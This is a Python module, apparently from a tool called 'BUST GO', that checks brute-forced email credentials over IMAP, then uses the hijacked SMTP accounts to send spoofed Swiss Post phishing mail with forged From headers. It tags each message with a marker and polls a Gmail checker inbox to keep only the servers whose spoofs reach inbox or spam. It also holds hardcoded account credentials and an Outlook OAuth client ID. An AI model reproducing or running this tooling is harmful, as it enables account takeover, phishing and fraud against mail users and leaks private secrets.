"""
BUST GO — IMAP Checker + Gmail Spoof Delivery Classifier.

Pipeline (mode 2):
  1. SMTP AUTH check
  2. Send SPOOF to Gmail checker (with unique marker in subject)
  3. Check Gmail IMAP → spoof arrived? inbox or spam?
  4. If arrived → keep SMTP + send spoof to user's address
  5. If not → discard SMTP
"""
from __future__ import annotations

import imaplib
import smtplib
import ssl
import socket
import time
import uuid
import threading
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ---------------------------------------------------------------------------
# IMAP Provider Database
# ---------------------------------------------------------------------------
IMAP_PROVIDERS: dict[str, tuple[str, int]] = {
    "outlook.com": ("outlook.office365.com", 993),
    "hotmail.com": ("outlook.office365.com", 993),
    "hotmail.fr": ("outlook.office365.com", 993),
    "hotmail.co.uk": ("outlook.office365.com", 993),
    "hotmail.de": ("outlook.office365.com", 993),
    "hotmail.it": ("outlook.office365.com", 993),
    "hotmail.es": ("outlook.office365.com", 993),
    "live.com": ("outlook.office365.com", 993),
    "live.fr": ("outlook.office365.com", 993),
    "live.co.uk": ("outlook.office365.com", 993),
    "live.de": ("outlook.office365.com", 993),
    "msn.com": ("outlook.office365.com", 993),
    "gmail.com": ("imap.gmail.com", 993),
    "googlemail.com": ("imap.gmail.com", 993),
    "yahoo.com": ("imap.mail.yahoo.com", 993),
    "yahoo.fr": ("imap.mail.yahoo.com", 993),
    "yahoo.co.uk": ("imap.mail.yahoo.com", 993),
    "yahoo.de": ("imap.mail.yahoo.com", 993),
    "ymail.com": ("imap.mail.yahoo.com", 993),
    "aol.com": ("imap.aol.com", 993),
    "icloud.com": ("imap.mail.me.com", 993),
    "me.com": ("imap.mail.me.com", 993),
    "mail.ru": ("imap.mail.ru", 993),
    "bk.ru": ("imap.mail.ru", 993),
    "yandex.ru": ("imap.yandex.com", 993),
    "yandex.com": ("imap.yandex.com", 993),
    "gmx.de": ("imap.gmx.net", 993),
    "gmx.net": ("imap.gmx.net", 993),
    "gmx.com": ("imap.gmx.com", 993),
    "zoho.com": ("imap.zoho.com", 993),
    "protonmail.com": ("", 0),
    "proton.me": ("", 0),
    "free.fr": ("imap.free.fr", 993),
    "orange.fr": ("imap.orange.fr", 993),
    "sfr.fr": ("imap.sfr.fr", 993),
    "laposte.net": ("imap.laposte.net", 993),
    "libero.it": ("imapmail.libero.it", 993),
    "web.de": ("imap.web.de", 993),
    "t-online.de": ("secureimap.t-online.de", 993),
    "rambler.ru": ("imap.rambler.ru", 993),
    "att.net": ("imap.mail.att.net", 993),
    "comcast.net": ("imap.comcast.net", 993),
    "fastmail.com": ("imap.fastmail.com", 993),
    "virginmedia.com": ("imap.virginmedia.com", 993),
    "hostinger.com": ("imap.hostinger.com", 993),
    "ovh.net": ("ssl0.ovh.net", 993),
}

IMAP_PATTERNS: list[tuple[str, str, int]] = [
    ("outlook", "outlook.office365.com", 993),
    ("hotmail", "outlook.office365.com", 993),
    ("live", "outlook.office365.com", 993),
    ("gmail", "imap.gmail.com", 993),
    ("yahoo", "imap.mail.yahoo.com", 993),
    ("aol", "imap.aol.com", 993),
    ("icloud", "imap.mail.me.com", 993),
    ("mail.ru", "imap.mail.ru", 993),
    ("yandex", "imap.yandex.com", 993),
    ("gmx", "imap.gmx.net", 993),
    ("rambler", "imap.rambler.ru", 993),
]


def get_imap_server(email: str) -> tuple[str, int] | None:
    domain = email.split("@")[1].lower() if "@" in email else ""
    if not domain:
        return None
    if domain in IMAP_PROVIDERS:
        host, port = IMAP_PROVIDERS[domain]
        return (host, port) if host else None
    for pattern, host, port in IMAP_PATTERNS:
        if pattern in domain:
            return (host, port)
    return (f"imap.{domain}", 993)


# ---------------------------------------------------------------------------
# Stub CheckerPool (disabled, kept for API compat)
# ---------------------------------------------------------------------------
class CheckerPool:
    def __init__(self):
        pass
    def add(self, *a, **kw):
        pass
    def pick_random(self, **kw):
        return None
    @property
    def size(self):
        return 0
    def reset(self):
        pass

checker_pool = CheckerPool()

# ---------------------------------------------------------------------------
# Gmail Checker — ONLY checker for delivery verification
# ---------------------------------------------------------------------------
GMAIL_CHECKER = {
    "email": "Malik.elmathy@gmail.com",
    "password": "pqnpfihscgxonwwf",
    "imap_host": "imap.gmail.com",
    "imap_port": 993,
}

def is_gmail_checker_configured() -> bool:
    return bool(GMAIL_CHECKER.get("email") and GMAIL_CHECKER.get("password"))

def get_gmail_checker_email() -> str:
    return GMAIL_CHECKER.get("email", "")


# ---------------------------------------------------------------------------
# Outlook Checker — OAuth2 XOAUTH2 IMAP for Outlook/Hotmail delivery check
# ---------------------------------------------------------------------------

OUTLOOK_CHECKER = {
    "email": "kockshyresheat1@outlook.com",
    "client_id": "9e5f94bc-e8a4-4e73-b8be-63364c29d753",
    "refresh_token": "",
    "imap_host": "outlook.office365.com",
    "imap_port": 993,
    "scope": "https://outlook.office.com/IMAP.AccessAsUser.All offline_access",
    "token_url": "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
    "spam_folder": "Junk",
    "inbox_folder": "Inbox",
}

_outlook_token_cache = {"access_token": "", "expires_at": 0.0}
_outlook_token_lock = threading.Lock()


def _load_outlook_refresh_token():
    """Load refresh token from file if not in memory."""
    if OUTLOOK_CHECKER["refresh_token"]:
        return OUTLOOK_CHECKER["refresh_token"]
    try:
        from pathlib import Path
        p = Path("/opt/darkvasend/.outlook_refresh_token")
        if p.exists():
            tok = p.read_text().strip()
            if tok:
                OUTLOOK_CHECKER["refresh_token"] = tok
                return tok
    except Exception:
        pass
    return ""


def _refresh_outlook_token():
    """Get fresh Outlook access token via OAuth2 refresh_token flow."""
    import httpx as _httpx

    with _outlook_token_lock:
        now = time.time()
        if _outlook_token_cache["access_token"] and _outlook_token_cache["expires_at"] > now + 60:
            return _outlook_token_cache["access_token"]

        refresh_tok = _load_outlook_refresh_token()
        if not refresh_tok:
            raise RuntimeError("No Outlook refresh token")

        r = _httpx.post(OUTLOOK_CHECKER["token_url"], data={
            "client_id": OUTLOOK_CHECKER["client_id"],
            "grant_type": "refresh_token",
            "refresh_token": refresh_tok,
            "scope": OUTLOOK_CHECKER["scope"],
        }, timeout=15)
        resp = r.json()

        if "access_token" not in resp:
            raise RuntimeError(f"Outlook token refresh failed: {resp.get('error', 'unknown')}")

        _outlook_token_cache["access_token"] = resp["access_token"]
        _outlook_token_cache["expires_at"] = now + resp.get("expires_in", 3600) - 120

        new_refresh = resp.get("refresh_token", "")
        if new_refresh:
            OUTLOOK_CHECKER["refresh_token"] = new_refresh
            try:
                from pathlib import Path
                Path("/opt/darkvasend/.outlook_refresh_token").write_text(new_refresh)
            except Exception:
                pass

        return _outlook_token_cache["access_token"]


def is_outlook_checker_configured():
    return bool(OUTLOOK_CHECKER.get("email") and _load_outlook_refresh_token())


def get_outlook_checker_email():
    return OUTLOOK_CHECKER.get("email", "")


def _connect_outlook_imap(timeout=20.0):
    """Connect to Outlook IMAP via OAuth2 XOAUTH2."""
    access_token = _refresh_outlook_token()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    imap = imaplib.IMAP4_SSL(
        OUTLOOK_CHECKER["imap_host"], OUTLOOK_CHECKER["imap_port"],
        ssl_context=ctx, timeout=timeout,
    )
    email = OUTLOOK_CHECKER["email"]
    auth_string = f"user={email}\x01auth=Bearer {access_token}\x01\x01"
    imap.authenticate("XOAUTH2", lambda x: auth_string.encode())
    return imap


def check_outlook_delivery(marker, max_retries=2, retry_delay=5.0, timeout=15.0):
    """Check Outlook for marker. Returns: inbox / spam / not_found / error."""
    for attempt in range(max_retries):
        if attempt > 0:
            time.sleep(retry_delay)
        try:
            imap = _connect_outlook_imap(timeout=timeout)
            # Junk FIRST
            try:
                st, _ = imap.select(OUTLOOK_CHECKER["spam_folder"], readonly=True)
                if st == "OK":
                    st2, ids = imap.search(None, f'(SUBJECT "{marker}")')
                    if st2 == "OK" and ids[0] and ids[0].strip():
                        imap.logout()
                        return "spam"
            except Exception:
                pass
            # Then Inbox
            try:
                st, _ = imap.select(OUTLOOK_CHECKER["inbox_folder"], readonly=True)
                if st == "OK":
                    st2, ids = imap.search(None, f'(SUBJECT "{marker}")')
                    if st2 == "OK" and ids[0] and ids[0].strip():
                        imap.logout()
                        return "inbox"
            except Exception:
                pass
            imap.logout()
        except Exception:
            if attempt == max_retries - 1:
                return "error"
    return "not_found"


def batch_outlook_imap(markers_to_check):
    """Batch check Outlook IMAP. Returns {marker: "inbox"/"spam"}."""
    results = {}
    if not markers_to_check or not is_outlook_checker_configured():
        return results
    try:
        imap = _connect_outlook_imap(timeout=30)
        # Junk FIRST
        try:
            st, _ = imap.select(OUTLOOK_CHECKER["spam_folder"], readonly=True)
            if st == "OK":
                for m in markers_to_check:
                    st2, ids = imap.search(None, f'SUBJECT "{m}"')
                    if st2 == "OK" and ids[0] and ids[0].strip():
                        results[m] = "spam"
        except Exception:
            pass
        remaining = [m for m in markers_to_check if m not in results]
        if remaining:
            try:
                st, _ = imap.select(OUTLOOK_CHECKER["inbox_folder"], readonly=True)
                if st == "OK":
                    for m in remaining:
                        st2, ids = imap.search(None, f'SUBJECT "{m}"')
                        if st2 == "OK" and ids[0] and ids[0].strip():
                            results[m] = "inbox"
            except Exception:
                pass
        imap.logout()
    except Exception as e:
        print(f"[OUTLOOK IMAP] batch error: {e}")
    return results




# ---------------------------------------------------------------------------
# 1. IMAP Auth Check (on bruted creds — filter fake auth)
# ---------------------------------------------------------------------------
def check_imap(email: str, password: str, timeout: float = 10.0) -> tuple[bool, str]:
    imap_info = get_imap_server(email)
    if not imap_info:
        return False, "NO_IMAP"
    host, port = imap_info
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        imap = imaplib.IMAP4_SSL(host, port, ssl_context=ctx, timeout=timeout)
        imap.login(email, password)
        status, data = imap.select("INBOX", readonly=True)
        msg_count = int(data[0]) if status == "OK" else 0
        imap.logout()
        return True, f"OK:{host}:{port}:msgs={msg_count}"
    except imaplib.IMAP4.error as e:
        err_str = str(e)
        if any(k in err_str.upper() for k in ("LOGIN", "AUTH", "DENIED", "DISABLED")):
            return False, "AUTH"
        return False, f"IMAP_ERR:{err_str[:60]}"
    except (socket.gaierror, socket.timeout, TimeoutError):
        return False, "TIMEOUT"
    except ConnectionRefusedError:
        return False, "REFUSED"
    except Exception as e:
        return False, f"ERR:{type(e).__name__}:{str(e)[:40]}"


# ---------------------------------------------------------------------------
# 2. Send SPOOF to Gmail checker (with marker in subject for tracking)
# ---------------------------------------------------------------------------
def _strip_tld(email: str) -> str:
    """Strip TLD: noreply@post.ch → noreply@post"""
    if "@" not in email:
        return email
    local, domain = email.rsplit("@", 1)
    parts = domain.split(".")
    return f"{local}@{parts[0]}" if len(parts) > 1 else email


def send_spoof_to_checker(
    smtp_host: str,
    smtp_port: int,
    smtp_user: str,
    smtp_password: str,
    checker_email: str,
    from_name: str,
    from_email: str,
    subject: str,
    html_body: str,
    marker: str = "",
    reply_to: str = "",
    timeout: float = 5.0,
) -> tuple[bool, str, str, str]:
    """
    Send SPOOF email to Gmail checker with a tracking marker.
    Tries full From spoof first, then stripped TLD.
    Returns (success, mode, error, marker).
    mode: "spoof" (full From) / "strip" (TLD stripped) / "failed"
    """
    if not marker:
        marker = f"BG-{uuid.uuid4().hex[:10]}"

    # Add marker to subject for IMAP tracking
    tracked_subject = f"{subject} [{marker}]"

    from email.utils import formataddr

    def _build_msg(from_hdr: str) -> str:
        msg = MIMEMultipart("alternative")
        msg["Subject"] = tracked_subject
        msg["To"] = checker_email
        msg["From"] = from_hdr
        if reply_to:
            msg["Reply-To"] = reply_to
        msg["Message-ID"] = f"<bg-{marker}@spoof>"
        msg["Date"] = time.strftime("%a, %d %b %Y %H:%M:%S %z")
        msg["X-Mailer"] = "Microsoft Outlook 16.0"
        msg["MIME-Version"] = "1.0"
        # Simple text fallback
        import re
        text = re.sub(r'<[^>]+>', '', html_body)[:500]
        msg.attach(MIMEText(text, "plain", "utf-8"))
        msg.attach(MIMEText(html_body, "html", "utf-8"))
        return msg.as_string()

    def _connect_and_send(from_hdr: str) -> tuple[bool, str]:
        try:
            if smtp_port == 465:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                server = smtplib.SMTP_SSL(smtp_host, smtp_port, timeout=timeout, context=ctx)
            else:
                server = smtplib.SMTP(smtp_host, smtp_port, timeout=timeout)
                server.ehlo()
                try:
                    server.starttls(context=ssl.create_default_context())
                    server.ehlo()
                except Exception:
                    pass
            server.login(smtp_user, smtp_password)
            raw = _build_msg(from_hdr)
            server.sendmail(smtp_user, [checker_email], raw)
            server.quit()
            return True, ""
        except smtplib.SMTPDataError as e:
            return False, f"DATA_{e.smtp_code}"
        except smtplib.SMTPAuthenticationError:
            return False, "AUTH"
        except smtplib.SMTPSenderRefused as e:
            return False, f"SENDER_{e.smtp_code}"
        except smtplib.SMTPRecipientsRefused:
            return False, "RCPT_REFUSED"
        except (socket.gaierror, socket.timeout, TimeoutError):
            return False, "TIMEOUT"
        except Exception as e:
            return False, f"{type(e).__name__}"

    # Attempt 1: Full From spoof
    full_from = formataddr((from_name, from_email))
    ok, err = _connect_and_send(full_from)
    if ok:
        return True, "spoof", "", marker

    if "AUTH" in err:
        return False, "failed", err, marker

    # Skip strip TLD for errors that won't work anyway
    if any(k in err for k in ("RCPT_REFUSED", "SMTPNotSupported")):
        return False, "failed", err, marker

    # Attempt 2: Stripped TLD
    stripped = _strip_tld(from_email)
    stripped_from = formataddr((from_name, stripped))
    time.sleep(0.2)
    ok2, err2 = _connect_and_send(stripped_from)
    if ok2:
        return True, "strip", "", marker

    return False, "failed", f"{err}/{err2}", marker


# ---------------------------------------------------------------------------
# 3. Check Gmail IMAP for spoof delivery (by marker)
# ---------------------------------------------------------------------------
def check_gmail_delivery(
    marker: str,
    max_retries: int = 2,
    retry_delay: float = 5.0,
    timeout: float = 15.0,
) -> str:
    """Check Gmail for spoof with marker. Returns: inbox / spam / not_found / error.
    SPAM is checked FIRST to avoid false INBOX classification when Gmail
    hasn't finished spam processing yet."""
    folders_spam = ["[Gmail]/Spam"]
    folders_inbox = ["INBOX"]

    for attempt in range(max_retries):
        if attempt > 0:
            time.sleep(retry_delay)
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            imap = imaplib.IMAP4_SSL(
                GMAIL_CHECKER["imap_host"], GMAIL_CHECKER["imap_port"],
                ssl_context=ctx, timeout=timeout,
            )
            imap.login(GMAIL_CHECKER["email"], GMAIL_CHECKER["password"])

            # CHECK SPAM FIRST (priority — avoids false inbox classification)
            for folder in folders_spam:
                try:
                    status, data = imap.select(folder, readonly=True)
                    if status != "OK":
                        continue
                    status, msg_ids = imap.search(None, f'(SUBJECT "{marker}")')
                    if status == "OK" and msg_ids[0] and msg_ids[0].strip():
                        imap.logout()
                        return "spam"
                except Exception:
                    continue

            # THEN CHECK INBOX
            for folder in folders_inbox:
                try:
                    status, data = imap.select(folder, readonly=True)
                    if status != "OK":
                        continue
                    status, msg_ids = imap.search(None, f'(SUBJECT "{marker}")')
                    if status == "OK" and msg_ids[0] and msg_ids[0].strip():
                        imap.logout()
                        return "inbox"
                except Exception:
                    continue

            imap.logout()
        except Exception:
            if attempt == max_retries - 1:
                return "error"
            continue

    return "not_found"


# ---------------------------------------------------------------------------
# 4. Full Pipeline — AUTH → Spoof to Gmail → Check delivery


# ---------------------------------------------------------------------------
# BATCH DELIVERY CHECKER — background thread, checks ALL markers at once
# ---------------------------------------------------------------------------
class BatchDeliveryChecker:
    """
    Background thread that batch-checks Gmail IMAP for spoof delivery markers.
    Instead of blocking each worker for 15-30s, markers are queued and checked
    in bulk every check_interval seconds.
    """

    def __init__(self, on_delivered=None, check_interval: float = 20.0, max_age: float = 300.0):
        self._pending: dict[str, dict] = {}  # marker -> {email, password, host, port, provider, ...}
        self._lock = threading.Lock()
        self._on_delivered = on_delivered  # callback(marker, delivery, smtp_info)
        self._check_interval = check_interval
        self._max_age = max_age  # drop markers older than this
        self._running = False
        self._thread = None
        self._results: dict[str, str] = {}  # marker -> "inbox"/"spam"/"not_found"

    def start(self):
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False

    def add_pending(self, marker: str, smtp_info: dict):
        """Add a marker to check. smtp_info = {email, password, host, port, provider, ...}"""
        with self._lock:
            smtp_info["_added_at"] = time.time()
            self._pending[marker] = smtp_info

    def get_result(self, marker: str) -> str | None:
        """Get result for a marker if available."""
        with self._lock:
            return self._results.get(marker)

    @property
    def pending_count(self) -> int:
        with self._lock:
            return len(self._pending)

    def reset(self):
        with self._lock:
            self._pending.clear()
            self._results.clear()

    def _loop(self):
        """Background loop — check Gmail IMAP for all pending markers."""
        while self._running:
            time.sleep(self._check_interval)
            if not self._running:
                break

            with self._lock:
                if not self._pending:
                    continue
                # Copy pending markers
                markers_to_check = dict(self._pending)

            if not markers_to_check:
                continue

            # Batch check Gmail IMAP — ONE connection for ALL markers
            try:
                found = self._batch_imap_check(list(markers_to_check.keys()))
            except Exception as e:
                print(f"[BATCH CHECKER] IMAP error: {e}")
                continue

            # Process results
            now = time.time()
            with self._lock:
                for marker, delivery in found.items():
                    if delivery in ("inbox", "spam"):
                        self._results[marker] = delivery
                        smtp_info = self._pending.pop(marker, None)
                        if smtp_info and self._on_delivered:
                            try:
                                self._on_delivered(marker, delivery, smtp_info)
                            except Exception as e:
                                print(f"[BATCH CHECKER] callback error: {e}")

                # Clean up old markers (> max_age)
                expired = [m for m, info in self._pending.items()
                           if now - info.get("_added_at", 0) > self._max_age]
                for m in expired:
                    self._results[m] = "expired"
                    self._pending.pop(m, None)
                    print(f"[BATCH CHECKER] EXPIRED: {m}")

    def _batch_imap_check(self, markers: list[str]) -> dict[str, str]:
        """Check Gmail IMAP for multiple markers in ONE connection."""
        results = {}
        if not markers or not is_gmail_checker_configured():
            return results

        try:
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
            imap = imaplib.IMAP4_SSL(
                GMAIL_CHECKER["imap_host"], GMAIL_CHECKER["imap_port"],
                ssl_context=ctx, timeout=20,
            )
            imap.login(GMAIL_CHECKER["email"], GMAIL_CHECKER["password"])

            # Check SPAM FIRST for all markers (priority)
            try:
                status, _ = imap.select("[Gmail]/Spam", readonly=True)
                if status == "OK":
                    for marker in markers:
                        status, msg_ids = imap.search(None, f'SUBJECT "{marker}"')
                        if status == "OK" and msg_ids[0] and msg_ids[0].strip():
                            results[marker] = "spam"
            except Exception:
                pass

            # Then check INBOX for remaining markers
            remaining = [m for m in markers if m not in results]
            if remaining:
                try:
                    status, _ = imap.select("INBOX", readonly=True)
                    if status == "OK":
                        for marker in remaining:
                            status, msg_ids = imap.search(None, f'SUBJECT "{marker}"')
                            if status == "OK" and msg_ids[0] and msg_ids[0].strip():
                                results[marker] = "inbox"
                except Exception:
                    pass

            imap.logout()
        except Exception as e:
            print(f"[BATCH CHECKER] Gmail IMAP connect error: {e}")

        if results:
            print(f"[BATCH CHECKER] Found {len(results)}/{len(markers)} markers: " +
                  ", ".join(f"{m}={d}" for m, d in results.items()))

        return results


# Global batch checker instance
batch_delivery_checker = BatchDeliveryChecker()

# ---------------------------------------------------------------------------
def full_cross_check(
    email: str,
    password: str,
    smtp_host: str,
    smtp_port: int,
    pool: CheckerPool | None = None,
    do_imap: bool = True,
    do_send: bool = True,
    do_delivery: bool = True,
    send_wait_sec: float = 15.0,
) -> dict:
    """
    Full spoof delivery pipeline:
      1. (Optional) IMAP check on bruted creds
      2. Send SPOOF template to Gmail checker
      3. Check Gmail IMAP: spoof arrived? inbox or spam?
    
    Only SMTPs where spoof ACTUALLY ARRIVES are kept.
    """
    result = {
        "imap_ok": False,
        "imap_info": "",
        "send_ok": False,
        "send_info": "",
        "delivery": "",
        "marker": "",
        "checker_used": "",
        "classification": "auth_only",
        "spoof_mode": "",
    }

    # 1. IMAP Check (optional — filter fake auth)
    if do_imap:
        imap_ok, imap_info = check_imap(email, password)
        result["imap_ok"] = imap_ok
        result["imap_info"] = imap_info
        if not imap_ok and any(k in imap_info.upper() for k in ("AUTH", "DISABLED", "NO_IMAP")):
            result["classification"] = "no_imap"
            return result  # Stop pipeline — fake auth, no point sending spoof

    # 2. Send SPOOF to Gmail checker
    if do_send:
        if not is_gmail_checker_configured():
            result["classification"] = "no_checker"
            return result

        # Load spoof template
        try:
            from .spoof_templates import get_template
            tpl = get_template("swisspost")
        except Exception:
            tpl = None

        if not tpl:
            result["classification"] = "no_template"
            return result

        gmail_email = GMAIL_CHECKER["email"]
        result["checker_used"] = gmail_email
        marker = f"BG-{uuid.uuid4().hex[:10]}"
        result["marker"] = marker

        send_ok, spoof_mode, send_err, marker = send_spoof_to_checker(
            smtp_host, smtp_port, email, password,
            gmail_email,
            tpl["from_name"], tpl["from_email"],
            tpl["subject"], tpl["html"],
            marker=marker,
            reply_to=tpl.get("reply_to", ""),
        )
        result["send_ok"] = send_ok
        result["send_info"] = send_err if send_err else spoof_mode
        result["spoof_mode"] = spoof_mode

        if not send_ok:
            result["classification"] = "spoof_rejected"
            return result

    # 3. Check Gmail for spoof delivery
    if do_delivery and result["send_ok"]:
        time.sleep(send_wait_sec)

        delivery = check_gmail_delivery(
            result["marker"],
            max_retries=3,
            retry_delay=8.0,
        )
        result["delivery"] = delivery

        if delivery == "inbox":
            result["classification"] = "inbox"
        elif delivery == "spam":
            result["classification"] = "spam"
        else:
            # Spoof sent but didn't arrive → useless SMTP
            result["classification"] = "not_delivered"
    elif result["send_ok"]:
        result["classification"] = "sent"

    return result


# Keep old function name for compat
def send_test_to_checker(*args, **kwargs):
    """Compat wrapper — not used anymore."""
    return False, "DISABLED", ""

def check_checker_delivery(*args, **kwargs):
    """Compat wrapper — not used anymore."""
    return "not_found"
